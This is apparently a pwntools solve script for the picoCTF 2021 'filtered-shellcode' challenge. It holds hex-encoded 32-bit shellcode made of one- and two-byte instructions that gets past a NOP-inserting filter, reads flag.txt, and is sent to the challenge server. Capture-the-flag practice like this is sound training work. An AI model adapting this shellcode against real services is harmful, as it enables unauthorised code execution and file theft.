#!/usr/bin/env python3
# filtered-shellcode - picoCTF 2021 (Binary Exploitation, Hard) by madStacks
# 32-bit program reads up to 1000 bytes then runs them, but the "filter" inserts
# two NOPs (90 90) after every two input bytes (and a trailing 0xc3).
# => every instruction must be 1-2 bytes; pad 1-byte insns with nop.
# Payload: 32-bit open("flag.txt")/read/write shellcode built from 1-2 byte insns.
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST = args.HOST or "wily-courier.picoctf.net"
PORT = int(args.PORT or 57055)

payload = bytes.fromhex(
    "31c9f7e15190"
    "31c031dbb011b303f7e3f7e3b302f7e3d1eb01d8b302f7e3f7e3d1eb01d8"
    "b302f7e3d1eb01d8b311f7e3b302f7e3f7e3d1eb01d85090"
    "31c0b07fb317f7e3b302f7e3d1eb01d8b302f7e35b90f7e35090"
    "31c031dbb02ff7e0b302f7e3f7e3d1eb01d85090"
    "31c0b02bb303f7e3b302f7e3f7e3f7e3d1eb01d8b313f7e3b305f7e3b302f7e35b90f7e35090"
    "31c0b00589e3cd8093909190b00331d25090"
    "31c031d2b240b040f7e250905a9031c0b00129c258904290cd809290"
    "31c0b004b301cd809390cd80"
)
assert len(payload) % 2 == 0, len(payload)

# sanity: disassemble the filtered result locally
try:
    filtered = b""
    for i in range(0, len(payload), 2):
        filtered += payload[i : i + 2] + b"\x90\x90"
    print(disasm(filtered)[:600])
except Exception as e:
    print("disasm err", e)

r = remote(HOST, PORT)
r.recvuntil(b"Give me code to run:")
r.sendline(payload)
try:
    data = r.recvrepeat(4)
except EOFError:
    data = b""
print(data.decode(errors="replace"))
import re

m = re.search(rb"picoCTF\{[^}]+\}", data)
if m:
    print("\n[+] FLAG:", m.group(0).decode())
r.close()
